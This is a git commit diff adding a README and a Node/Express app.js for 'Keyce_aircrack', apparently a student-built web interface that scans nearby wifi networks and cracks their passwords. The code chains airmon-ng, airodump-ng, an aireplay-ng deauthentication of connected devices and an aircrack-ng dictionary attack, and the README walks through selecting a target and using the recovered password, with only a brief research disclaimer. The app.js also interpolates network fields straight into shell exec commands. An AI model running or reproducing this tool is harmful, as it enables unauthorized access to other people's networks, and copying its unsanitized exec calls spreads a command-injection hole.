a7d5073d40c5ac0284e426c3961f93feb673b049
Antonin <antonin.royer84@gmail.com>
2022-03-18 04:06:07 -0700

    final commit

--- README.md
+++ README.md
@@ -1,1 +1,50 @@
 # Keyce_aircrack
+
+Hi welcome to the readme of the Keyce_aircrack graphic interface !
+
+A little intro:
+
+Keyce_aircrack is a graphical interface to scan and find passwords of surrounding wifi.
+Warning, this application has been developed for research purposes and any fraudulent use is forbidden.
+The creators disclaim any malicious use of their software.
+
+Pre-requireds:
+- aircrack-ng
+- a wifi usb NIC
+- a Virtual Machine with a Linux distribution
+- a dictionnary file
+
+Instruction:
+1- Download the github repository.
+2- In your CLI go to the downloaded folder.
+3- launch the express server with the command "node app.js".
+4- when the server start listening open your favorite navigator and write "localhost:3000" in the search bar, enter.
+5- Click on the search button to start scanning networks.
+6- Select the newtwork you want to crack.
+7- Click on the Crack button to start hacking.
+8- Wait a minute and the password will appear on the page.
+9- Now you can connect to the network with the recover password.
+10- If the NIC dont work properly try to try unplugging and replugging it.
+
+Post-Scriptum: our software work with dictionnary attacks, we have already one in our folder but you can use your own dico by replacing the dico.txt file or by adding words to try in the file.
+
+Made with:
+aircrack-ng
+hashcat
+
+Versions: 1.0
+
+Authors:
+
+PAPIN Nicolas
+AMALOU Damien
+BREEL Chirroc
+? Anthony
+ROYER Antonin
+EGDADI Youssouf
+JOHNSON Grace
+LAIB Harun
+
+License: Open-Source
+
+
--- app.js
+++ app.js
@@ -1,23 +1,64 @@
 const express = require('express')
 var iwlist = require('wireless-tools/iwlist');
 const path = require('path');
+const { exec } = require("child_process");
 
+const INTERFACE_1 = 'wlx00c0ca970255'
+const INTERFACE_2 = 'wlan0mon'
+const TARGET_MAC = 'b6:79:f6:88:d3:c0'
+const PORT = 3000
 
 const app = express()
-const port = 3000
+app.use(express.json())
+
+let wifiList = []
+let selectedWifi = {}
+
+app.use('/images', express.static(__dirname + '/images'));
 
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, '/index.html'));
 })
 
-app.listen(port, () => {
-    console.log(`Example app listening on port ${port}`)
+app.get('/networks', async(req, res) => {
+    console.log('Scanning for wifis ...')
+    iwlist.scan(INTERFACE_1, function(err, networks) {
+        wifiList = networks
+        res.json(wifiList)
+    });
 })
 
-app.get('/networks', async(req, res) => {
-    const INTERFACE = 'wlx00c0ca970255'
-    iwlist.scan(INTERFACE, function(err, networks) {
-        console.log(networks);
-        res.json(networks)
+app.post('/crack', async(req, res) => {
+    selectedWifi = wifiList.filter(wifi => wifi.address === req.body.address)[0];
+    console.log('Starting attack on following target :')
+    console.log(selectedWifi)
+
+    exec(`airmon-ng start wlx00c0ca970255 ${INTERFACE_1}\n airodump-ng -c ${selectedWifi.channel} --bssid ${selectedWifi.address} -w psk ${INTERFACE_2}`, (error, stdout, stderr) => {
+        console.log(`stdout: ${stdout}`);
     });
+
+    setTimeout(() => {
+        console.log("disconnecting all devices")
+        exec(`aireplay-ng -0 1 -a ${selectedWifi.address} ${INTERFACE_2}`, (error, stdout, stderr) => {
+            console.log(`stdout: ${stdout}`);
+        });
+    }, 10000);
+
+    setTimeout(() => {
+        console.log(`Running : aircrack-ng -w dico.txt -b ${selectedWifi.address} psk*.cap`)
+        exec(`aircrack-ng -w dico.txt -b ${selectedWifi.address} psk*.cap`, (error, stdout, stderr) => {
+            let array = stdout.split('\n')
+            let secondArray = array.filter(x => {
+                return x.includes('passphrase')
+            })
+            const password = secondArray[0].split(':')[1].replace(/\s/g, '')
+            console.log('WIFI PASSWORD : ', password)
+            res.json({ password })
+        });
+    }, 20000);
+
+})
+
+app.listen(PORT, () => {
+    console.log(`Example app listening on port ${PORT}`)
 })
